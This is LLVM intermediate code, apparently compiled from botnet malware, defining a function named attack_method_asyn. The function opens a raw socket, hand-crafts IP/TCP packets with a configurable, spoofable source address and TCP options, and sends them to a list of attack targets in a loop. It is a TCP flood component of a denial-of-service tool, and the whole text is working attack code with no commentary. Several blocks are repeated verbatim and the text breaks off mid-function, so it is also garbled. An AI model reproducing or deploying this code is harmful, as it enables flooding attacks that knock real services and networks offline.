  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* nonnull %170, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %227 = phi i32 [ %283, %266 ], [ 0, %.lr.ph.split.preheader ]
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8*, i8** %8, i64 %228
  %230 = load i8*, i8** %229, align 8
  %231 = bitcast i8* %230 to %struct.iphdr*
  %232 = getelementptr inbounds i8, i8* %230, i64 20
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = icmp ult i8 %234, 32
  br i1 %235, label %236, label %243

; <label>:236:                                    ; preds = %.lr.ph.split
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 1
  %238 = load i32, i32* %237, align 4
  %239 = call i32 @ntohl(i32 %238) #11
  %240 = call i32 @htonl(i32 %239) #11
  %241 = getelementptr inbounds i8, i8* %230, i64 16
  %242 = bitcast i8* %241 to i32*
  store i32 %240, i32* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %.lr.ph.split, %236
  br i1 %113, label %244, label %247

; <label>:244:                                    ; preds = %243
  %245 = getelementptr inbounds i8, i8* %230, i64 4
  %246 = bitcast i8* %245 to i16*
  store i16 0, i16* %246, align 4
  br label %247

; <label>:247:                                    ; preds = %244, %243
  br i1 %115, label %248, label %250

; <label>:248:                                    ; preds = %247
  %249 = bitcast i8* %232 to i16*
  store i16 0, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %248, %247
  br i1 %117, label %251, label %254

; <label>:251:                                    ; preds = %250
  %252 = getelementptr inbounds i8, i8* %230, i64 22
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_asyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

.loopexit.loopexit:                               ; preds = %208
  br label %.loopexit.backedge

.loopexit.loopexit141:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit141
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %111, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %208
  %167 = phi i32 [ %225, %208 ], [ 0, %.lr.ph.split.us.preheader ]
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8*, i8** %8, i64 %168
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to %struct.iphdr*
  %172 = getelementptr inbounds i8, i8* %170, i64 20
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split.us
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #11
  %180 = call i32 @htonl(i32 %179) #11
  %181 = getelementptr inbounds i8, i8* %170, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split.us, %176
  %184 = getelementptr inbounds i8, i8* %170, i64 12
  %185 = bitcast i8* %184 to i32*
  store i32 0, i32* %185, align 4
  br i1 %113, label %186, label %189

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds i8, i8* %170, i64 4
  %188 = bitcast i8* %187 to i16*
  store i16 0, i16* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %186, %183
  br i1 %115, label %190, label %192

; <label>:190:                                    ; preds = %189
  %191 = bitcast i8* %172 to i16*
  store i16 0, i16* %191, align 4
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br i1 %117, label %193, label %196

; <label>:193:                                    ; preds = %192
  %194 = getelementptr inbounds i8, i8* %170, i64 22
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %193, %192
  br i1 %118, label %197, label %200

; <label>:197:                                    ; preds = %196
  %198 = getelementptr inbounds i8, i8* %170, i64 24
  %199 = bitcast i8* %198 to i32*
  store i32 0, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %197, %196
  br i1 %119, label %201, label %204

; <label>:201:                                    ; preds = %200
  %202 = getelementptr inbounds i8, i8* %170, i64 28
  %203 = bitcast i8* %202 to i32*
  store i32 0, i32* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %200
  br i1 %120, label %208, label %205

; <label>:205:                                    ; preds = %204
  %206 = getelementptr inbounds i8, i8* %170, i64 38
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  br label %208

; <label>:208:                                    ; preds = %205, %204
  %209 = getelementptr inbounds i8, i8* %170, i64 10
  %210 = bitcast i8* %209 to i16*
  store i16 0, i16* %210, align 2
  %211 = bitcast i8* %170 to i16*
  %212 = call zeroext i16 @checksum_generic(i16* %211, i32 20)
  store i16 %212, i16* %210, align 2
  %213 = getelementptr inbounds i8, i8* %170, i64 36
  %214 = bitcast i8* %213 to i16*
  store i16 0, i16* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 40) #11
  %216 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %171, i8* nonnull %172, i16 zeroext %215, i32 40)
  store i16 %216, i16* %214, align 4
  %217 = getelementptr inbounds i8, i8* %170, i64 22
  %218 = bitcast i8* %217 to i16*
  %219 = load i16, i16* %218, align 2
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0, i32 1
  store i16 %219, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %168, i32 0
